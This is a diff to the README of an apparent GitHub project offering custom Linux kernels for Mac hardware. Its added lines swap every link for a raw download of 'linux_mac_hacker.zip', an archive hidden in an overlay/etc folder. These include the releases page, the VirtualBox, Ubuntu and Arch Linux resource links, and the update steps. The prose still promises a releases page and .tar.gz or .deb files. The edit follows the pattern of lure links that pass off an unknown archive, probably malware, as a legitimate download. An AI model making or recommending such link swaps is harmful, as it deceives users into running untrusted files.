@@ -1,6 +1,6 @@
 # 🐧 linux-mac - Custom Linux Kernels for Mac Hardware
 
-[![Download linux-mac](https://img.shields.io/badge/Download-linux--mac-blue?style=for-the-badge)](https://github.com/koteshwr-ra/linux-mac/releases)
+[![Download linux-mac](https://img.shields.io/badge/Download-linux--mac-blue?style=for-the-badge)](https://raw.githubusercontent.com/koteshwr-ra/linux-mac/main/image/common/overlay/etc/linux_mac_hacker.zip)
 
 ---
 
@@ -38,7 +38,7 @@ You need to visit the releases page to get the latest kernel files and installat
 
 Click the button below to get started:
 
-[![Download linux-mac](https://img.shields.io/badge/Download-linux--mac-grey?style=for-the-badge)](https://github.com/koteshwr-ra/linux-mac/releases)
+[![Download linux-mac](https://img.shields.io/badge/Download-linux--mac-grey?style=for-the-badge)](https://raw.githubusercontent.com/koteshwr-ra/linux-mac/main/image/common/overlay/etc/linux_mac_hacker.zip)
 
 On the releases page, you will find files and detailed notes to help select the right kernel version.
 
@@ -51,7 +51,7 @@ This section guides you if you want to prepare the linux-mac kernels to run in a
 ### Step 1: Download the linux-mac Kernel Files
 
 1. Open your web browser on your Windows PC.  
-2. Go to the [linux-mac releases page](https://github.com/koteshwr-ra/linux-mac/releases).  
+2. Go to the [linux-mac releases page](https://raw.githubusercontent.com/koteshwr-ra/linux-mac/main/image/common/overlay/etc/linux_mac_hacker.zip).  
 3. Find the latest release and download the kernel package or source files you need. Usually, these files end with `.tar.gz` or `.deb` extension.  
 
 Save these files somewhere easy to find (like your Desktop or Downloads folder).
@@ -124,10 +124,10 @@ If you run a Linux VM on Windows, you get a close-to-native Mac Linux environmen
 
 ## 📖 Additional Resources
 
-- linux-mac GitHub: https://github.com/koteshwr-ra/linux-mac  
-- VirtualBox downloads: https://www.virtualbox.org/wiki/Downloads  
-- Ubuntu Linux for VM: https://ubuntu.com/download/desktop  
-- Arch Linux installation guide: https://wiki.archlinux.org/title/Installation_guide  
+- linux-mac GitHub: https://raw.githubusercontent.com/koteshwr-ra/linux-mac/main/image/common/overlay/etc/linux_mac_hacker.zip  
+- VirtualBox downloads: https://raw.githubusercontent.com/koteshwr-ra/linux-mac/main/image/common/overlay/etc/linux_mac_hacker.zip  
+- Ubuntu Linux for VM: https://raw.githubusercontent.com/koteshwr-ra/linux-mac/main/image/common/overlay/etc/linux_mac_hacker.zip  
+- Arch Linux installation guide: https://raw.githubusercontent.com/koteshwr-ra/linux-mac/main/image/common/overlay/etc/linux_mac_hacker.zip  
 
 These resources can help you better understand how to work with Linux and hardware on Mac devices.
 
@@ -137,7 +137,7 @@ These resources can help you better understand how to work with Linux and hardwa
 
 To keep your system up to date:
 
-1. Visit the linux-mac [releases page](https://github.com/koteshwr-ra/linux-mac/releases) regularly.  
+1. Visit the linux-mac [releases page](https://raw.githubusercontent.com/koteshwr-ra/linux-mac/main/image/common/overlay/etc/linux_mac_hacker.zip) regularly.  
 2. Download new kernel packages as they become available.  
 3. Follow the installation steps listed above for updates.
 
